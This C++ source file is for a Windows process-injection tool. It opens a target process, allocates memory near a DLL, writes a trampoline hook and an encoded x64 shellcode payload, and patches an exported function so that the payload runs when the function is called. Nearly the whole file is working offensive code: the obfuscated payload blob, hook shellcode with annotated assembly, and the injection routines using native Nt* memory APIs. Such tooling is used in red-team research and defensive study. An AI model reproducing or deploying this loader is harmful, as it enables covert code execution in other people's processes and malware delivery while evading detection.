#include "headers/payload.h"
#include "utils/headers/CRTdefs.h"
#include "intrin.h"
#include <winternl.h>
#include "utils/headers/Tools.h"

// x64 calc payload
//unsigned char payload[106] = {
//	0x53, 0x56, 0x57, 0x55, 0x54, 0x58, 0x66, 0x83, 0xE4, 0xF0, 0x50, 0x6A,
//	0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x29, 0xD4,
//	0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10,
//	0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C,
//	0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B,
//	0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81,
//	0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C,
//	0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7,
//	0x48, 0x83, 0xC4, 0x68, 0x5C, 0x5D, 0x5F, 0x5E, 0x5B, 0xC3
//};


unsigned char payload[] =
"\x48\x31\xc9\x48\x81\xe9\xac\xff\xff\xff\x48\x8d\x05\xef"
"\xff\xff\xff\x48\xbb\xdc\xae\xed\xe9\x52\x67\x22\x43\x48"
"\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x94\x9f\x24"
"\xa1\xd3\x8e\x93\xbc\x23\x51\xa5\x64\x57\x88\xdd\xbc\x23"
"\xe6\x56\x7c\xab\x82\x07\x7a\x01\xed\xa3\xa1\x63\x3f\x05"
"\x0b\xf1\x56\x12\x16\xad\x85\xd6\x9e\x14\x82\x80\x51\x66"
"\x92\x93\x29\xda\x03\x45\xd5\x60\xdb\x93\x29\x6d\xf0\x3d"
"\xb0\x3d\xa5\xd2\x8a\xeb\xba\x80\xe1\xd7\x03\x24\xfb\xdd"
"\xb4\x37\x2f\x6d\xd0\xd1\x87\x5e\x82\xf7\x65\xfa\x2a\x66"
"\x49\xdf\x47\x73\x63\xbe\x2a\x66\xfe\x2c\x4f\x5d\xba\x97"
"\xe1\xcb\xad\xf0\x82\x47\xd4\x66\x9d\xb4\x4e\x68\x35\x89"
"\x6e\xb5\x18\x83\x49\x09\x7f\xcd\x57\xd9\xaf\x4d\xc8\xcc"
"\xfb\xcb\x68\xd9\xaf\xfa\x3b\xd1\x07\xe3\xe4\xe3\x1b\x93"
"\x15\x09\xcf\x7c\xb0\x6e\x7d\x4a\x7f\xbe\x01\xc6\x63\x4a"
"\xe1\xf6\x17\x74\x5d\xc9\x02\xb6\xa9\x34\xa2\xc5\xe5\x57"
"\x53\xe0\xe1\x44\x21\xe1\xfd\x8e\x50\xd6\xe1\xfe\xa1\x9c"
"\xfd\x8e\x50\x96\xe1\xfe\x81\xd4\xf8\x34\xcb\xfe\xa6\xc2"
"\xb9\xce\xfd\x34\xc2\x1a\x95\x14\x8f\x86\x99\x25\x43\x77"
"\x60\x78\xb2\x85\x74\xe7\xef\xe4\xe1\xfe\xa1\xa4\xf4\x54"
"\x89\xf4\x95\x3d\xf2\x54\xd3\x84\x7a\xae\xa2\x77\xfc\x01"
"\xc7\x05\x02\xb6\x22\xf5\x7b\x84\xb5\x05\x4a\x33\x69\x01"
"\x94\xcc\xb4\xd5\x89\xfe\xb1\x31\x78\xc4\x95\x55\x4b\xb7"
"\x79\x96\xa5\xcc\x4a\xcc\x4f\x87\x60\x34\x78\xb0\x3d\x4d"
"\x03\x60\xe1\x44\x33\xc5\x74\xcc\x0f\x1a\xe8\x74\x32\xbc"
"\x55\x70\xf3\xfa\xaa\x39\xd7\x8c\xf0\x3c\xd3\xc3\x71\x2d"
"\xb7\x0f\xf5\x21\x4b\xb7\x79\x13\xb2\x0f\xb9\x4d\x46\x3d"
"\xe9\x69\xba\x85\x65\x44\x89\xb2\x21\x3d\xf2\x54\xf4\x5d"
"\x43\xee\xf7\x2c\xa9\xc5\xed\x44\x5b\xf7\xf3\x3d\x70\x68"
"\x95\x44\x50\x49\x49\x2d\xb2\xdd\xef\x4d\x89\xa4\x40\x3e"
"\x0c\x7b\x4a\x58\x4b\x08\xde\x06\xc1\xdb\x86\x37\x02\xb6"
"\xe8\x23\xba\x0d\x53\x4d\x83\x5a\x09\x74\xf3\x84\xfc\x8c"
"\xe7\xff\x15\x77\xf3\x95\xe9\x0f\x02\xb4\xa6\x34\xa7\xcd"
"\x3c\xe1\x4e\x3f\x58\x34\x49\xc8\xc2\x23\x05\x49\x7c\x39"
"\x7a\x6e\xdd\x04\x03\xb6\xa9\x2c\xb2\x3e\x9c\x85\x69\xb6"
"\x56\xa0\x99\x8e\xf4\x5b\x52\xe6\xe4\x44\x3a\xc9\x84\xc5"
"\x4a\x49\x69\x3d\x7a\x46\xfd\xfa\xc2\xfe\x20\xb4\xb2\x3e"
"\x5f\x0a\xdd\x56\x56\xa0\xbb\x0d\x72\x6f\x12\xf7\xf1\x39"
"\x7a\x66\xfd\x8c\xfb\xf7\x13\xec\x56\xf0\xd4\xfa\xd7\x33"
"\x69\x01\xf9\xcd\x4a\xcb\x77\x53\x41\xe6\xf3\x84\xb5\x4d"
"\x81\x5a\xb9\x3d\x7a\x66\xf8\x34\xcb\xdc\xad\x34\xab\xcc"
"\x3c\xfc\x43\x0c\xab\xac\x3b\xdb\x4a\xd0\x81\x4e\xa9\x0b"
"\xa6\xcc\x36\xc1\x22\xe8\x20\x83\x99\xc4\xf4\x5c\x6a\xb6"
"\xb9\x75\xf3\xc5\xed\x4d\x8b\x44\xe1\x44\x3a\xc5\x0f\x5d"
"\xa6\xe5\x4c\x8a\x26\xcc\x3c\xc6\x4b\x3f\x6e\x38\xc2\x4d"
"\xfc\x8c\xf2\xfe\x20\xaf\xbb\x0d\x4c\x44\xb8\xb4\x70\xbd"
"\xac\x7b\x60\x86\xfa\xb6\xd4\x5d\xab\xc5\xe2\x5c\x6a\xb6"
"\xe9\x75\xf3\xc5\xed\x6f\x02\xec\xe8\xcf\xf8\xab\xba\x35"
"\xfd\x63\xfe\x2c\xb2\x3e\xc0\x6b\x4f\xd7\x56\xa0\xba\x7b"
"\x7b\xec\x3e\x49\x56\x8a\xbb\x85\x76\x4d\x2b\x70\xe1\xf0"
"\x05\xf1\x01\x44\xfd\x51\xf1\x1f\xf3\xdd\xfc\xc2\xc0\x46"
"\x1c\xd7\xa5\x7b\x60\x05\x02\x26\xd5\x6c\x43";


// Trampoline hook shellcode
unsigned char hook[63] = {
	0x5B, 0x48, 0x83, 0xEB, 0x04, 0x48, 0x83, 0xEB, 0x01, 0x53, 0x51,
	0x52, 0x41, 0x51, 0x41, 0x50, 0x41, 0x53, 0x41, 0x52, 0x48, 0xB9,
	0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x48, 0x89, 0x0B,
	0x48, 0x83, 0xEC, 0x20, 0x48, 0x83, 0xEC, 0x20, 0xE8, 0x11, 0x00,
	0x00, 0x00, 0x48, 0x83, 0xC4, 0x40, 0x41, 0x5A, 0x41, 0x5B, 0x41,
	0x58, 0x41, 0x59, 0x5A, 0x59, 0x5B, 0xFF, 0xE3
};



// Executes the payload by instantiating the class
Payload::Payload(DWORD process, API::API_ACCESS& api, const char* dll, char* function)
{
	Tools tools;

	ULONG_PTR uAddress = NULL;

	HMODULE hModule = GetModuleHandleA(dll);

	if (hModule == INVALID_HANDLE_VALUE)
	{
		MessageBoxA(NULL, "invalid module handle", "error", MB_ICONWARNING);
		ExitProcess(-1);
	}

	FARPROC pFunctionToHook = (FARPROC)API::GetProcessAddress(hModule, function);

	if (!pFunctionToHook)
	{
		MessageBoxA(NULL, "couldn't get address of function", "error", MB_ICONWARNING);
		ExitProcess(-1);
	}


	PatchHook(pFunctionToHook);


	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, process);

	if (hProcess == INVALID_HANDLE_VALUE)
		tools.ExitProgram("failed to get a handle to the process");

	if (!LocateMemoryGap(hProcess, &uAddress, reinterpret_cast<ULONG_PTR>(pFunctionToHook), sizeof(payload) + sizeof(hook), api))
		tools.ExitProgram("failed to find a memory gap");


	if (!WritePayloadBuffer(hProcess, uAddress, (ULONG_PTR)hook, sizeof(hook), (ULONG_PTR)payload, sizeof(payload)))
		tools.ExitProgram("failed to write payload buffer");


	if (!InstallHook(hProcess, pFunctionToHook, reinterpret_cast<void*>(uAddress)))
		tools.ExitProgram("failed to install hook");


	//MessageBoxA(NULL, "installed payload", "yay", MB_ICONWARNING);


}

// Locates a memory gap next to the DLL that exports the hooked function
bool Payload::LocateMemoryGap(HANDLE hProcess, _Out_ ULONG_PTR* puAddress, uintptr_t pHookedFunction, size_t sPayloadSize, API::API_ACCESS& api) {

	NTSTATUS    status    = NULL;
	ULONG_PTR   uAddress  = NULL;
	size_t      sTempSize = sPayloadSize;

	if (!api.func.pNtAllocateVirtualMemory)
		return false;

	for (uAddress = (pHookedFunction & 0xFFFFFFFFFFF70000) - 0x70000000;
		uAddress < pHookedFunction + 0x70000000;
		uAddress += 0x10000) {

		// Attempt to allocate virtual memory
		status = api.func.pNtAllocateVirtualMemory(hProcess, reinterpret_cast<void**>(&uAddress), 0x00, &sTempSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

		if (NT_SUCCESS(status)) {
			*puAddress = uAddress;
			return true;
		}
	}

	return false;
}



// This function redirects execution to the shellcode put into the memory gap, which uses a relative call instruction which requires an offset
bool Payload::InstallHook(HANDLE hProcess, void *pExportedFunc, void* pMainPayloadAddress)
{
	NTSTATUS status		   = NULL;

	DWORD dwOldProtection  = NULL;
	UCHAR uTrampoline[0x5] = { 0xE8, 0x0, 0x0, 0x0, 0x0 }; // Call rva
	unsigned long uRVA     = static_cast<unsigned long>((reinterpret_cast<ULONG_PTR>(pMainPayloadAddress) - (reinterpret_cast<ULONG_PTR>(pExportedFunc) + sizeof(uTrampoline)))); // The RVA 
	
	size_t sTempSize	   = sizeof(uTrampoline); 
	size_t sBytesWritten   = NULL;

	void *pTempAddr		   = pExportedFunc;

	auto &resolver = API::APIResolver::GetInstance();
	auto api		  = resolver.GetAPIAccess();

	if (!api.func.pNtProtectVirtualMemory || !api.func.pNtWriteVirtualMemory || !api.func.pNtProtectVirtualMemory)
		return false;
	
	memcpy(&uTrampoline[1], &uRVA, sizeof(uRVA));

	// Get write access to the targeted function
	if (!NT_SUCCESS(status = api.func.pNtProtectVirtualMemory(hProcess, &pTempAddr, &sTempSize, PAGE_READWRITE, &dwOldProtection)))
	{
		MessageBoxA(NULL, "failed to get write access to the targeted function", "error", MB_ICONWARNING);
		return false;
	}

	// Patch 5 bytes of the exported function with the trampoline
	if (!NT_SUCCESS((status = api.func.pNtWriteVirtualMemory(hProcess, pExportedFunc, uTrampoline, sizeof(uTrampoline), &sBytesWritten))) || sBytesWritten != sizeof(uTrampoline))
	{
		MessageBoxA(NULL, "failed to patch function", "error", MB_ICONWARNING);

		return false;
	}

	// Restore values
	sTempSize = sizeof(uTrampoline);
	pTempAddr = pExportedFunc;

	// Mark pExportedFunc as rwx, shellcode will restore bytes that were replaced by the trampoline
	if (!NT_SUCCESS(status = api.func.pNtProtectVirtualMemory(hProcess, &pTempAddr, &sTempSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)))
	{
		MessageBoxA(NULL, "failed to make function rwx", "error", MB_ICONWARNING);
		return false;
	}


	return true;
}

/* Hook shellcode
https://defuse.ca/online-x86-assembler.htm
																	  ; Original Shellcode:
start:
	; Save the address of the hooked function to the stack
	0:  5b                      pop    rbx							; instead of 'pop rax'
	1:  48 83 eb 04             sub    rbx,0x4						; instead of 'sub rax,0x5'
	5:  48 83 eb 01             sub    rbx,0x1
	9:  53                      push   rbx							; instead of 'push rax'

	; Save the hooked function's parameters
	a:  51                      push   rcx
	b:  52                      push   rdx
	c:  41 51                   push   r9							; instead of 'push r8'
	e:  41 50                   push   r8							; instead of 'push r9'
	10: 41 53                   push   r11							; instead of 'push r10'
	12: 41 52                   push   r10							; instead of 'push r11'

	; "0xaaaaaaaaaaaaaaaa" will be patched at runtime
	; Restore the hooked function's original bytes
	14: 48 b9 aa aa aa aa aa    movabs rcx,0xaaaaaaaaaaaaaaaa			; Place holder of the original bytes of the hooked function - instead of '0x1122334455667788'    (AT BYTE NMBR: 22)
	1b: aa aa aa
	1e: 48 89 0b                mov    QWORD PTR [rbx],rcx			; instead of '[rax]'

	; Execute the main payload
	21: 48 83 ec 20             sub    rsp,0x20
	25: 48 83 ec 20             sub    rsp,0x20
	29: e8 11 00 00 00          call   3f <shellcode>
	2e: 48 83 c4 40             add    rsp,0x40

	; Restore the hooked function's parameters
	32: 41 5a                   pop    r10							; instead of 'pop r11'
	34: 41 5b                   pop    r11							; instead of 'pop r10'
	36: 41 58                   pop    r8							; instead of 'pop r9'
	38: 41 59                   pop    r9							; instead of 'pop r8'
	3a: 5a                      pop    rdx
	3b: 59                      pop    rcx

	; Pass the execution to the hooked function, that will execute normally
	3c: 5b                      pop    rbx							; instead of 'pop rax'
	3d: ff e3                   jmp    rbx							; instead of 'jmp rax'

*/


void Payload::PatchHook(void *pExportedFunc) {
	// ullOriginalBytes is the first 8 bytes of the hooked function (before hooking)
	unsigned long long uOriginalBytes = *(unsigned long long*)pExportedFunc;

	// The place holder (0xaaaaaaaaaaaaaaaa) is at the 22nd byte
	memcpy(&hook[22], &uOriginalBytes, sizeof(uOriginalBytes));
}

bool Payload::WritePayloadBuffer( HANDLE hProcess, ULONG_PTR uAddress, ULONG_PTR uHookShellcode, size_t sHookShellcodeSize, ULONG_PTR uPayloadBuffer, size_t sPayloadSize)
{

	size_t		sTempSize		= sPayloadSize;
	size_t		sBytesWritten   = 0x00;
	DWORD		dwOldProtection = 0x00;
	NTSTATUS	status			= NULL;

	auto& resolver = API::APIResolver::GetInstance();
	auto api		  = resolver.GetAPIAccess();

	// Write g_HookShellcode
	if (!NT_SUCCESS((status = api.func.pNtWriteVirtualMemory(hProcess, reinterpret_cast<void*>(uAddress), reinterpret_cast<void*>(uHookShellcode), sHookShellcodeSize, &sBytesWritten))) || sBytesWritten != sHookShellcodeSize) 
		return false;
	
	// Write main payload after g_HookShellcode
	if (!NT_SUCCESS((status = api.func.pNtWriteVirtualMemory(hProcess, reinterpret_cast<void*>(uAddress + sBytesWritten), reinterpret_cast<void*>(uPayloadBuffer), sPayloadSize, &sBytesWritten))) || sBytesWritten != sPayloadSize) 
		return false;
	
	if (!NT_SUCCESS((status = api.func.pNtProtectVirtualMemory(hProcess, reinterpret_cast<void**>(&uAddress), &sTempSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)))) 
		return false;
	

	return true;
}